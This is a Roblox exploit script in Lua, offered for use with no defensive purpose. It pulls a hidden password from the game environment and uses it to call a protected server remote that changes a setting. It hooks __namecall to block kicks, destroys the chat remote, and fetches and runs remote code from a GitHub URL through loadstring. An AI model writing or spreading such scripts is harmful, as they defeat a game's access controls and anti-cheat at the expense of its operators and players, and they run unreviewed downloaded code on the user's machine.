--// Local Args
local args = {
    [1] = {
        [1] = getrenv()._G.Pass,
        [2] = "ChangeSetting",
        [3] = "MorphEnabled",
        [4] = true
    }
}

--// Whitelist Disable
local Players = game:GetService("Players")
local Player = Players.LocalPlayer

local OldNameCall 
OldNameCall = hookmetamethod(game, "__namecall", function(...) 
    local Self, Args = (...), ({select(2, ...)})

    if getnamecallmethod() == "Kick" and Self == Player then 
        return
    end

    return OldNameCall(...)
end)
--// Misc stuff
game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest:Destroy()
game:GetService("ReplicatedStorage").Remotes.Functions:InvokeServer(unpack(args))

loadstring(game:HttpGet("https://raw.githubusercontent.com/notxeoria/fun-projects/main/truechara.lua"))()
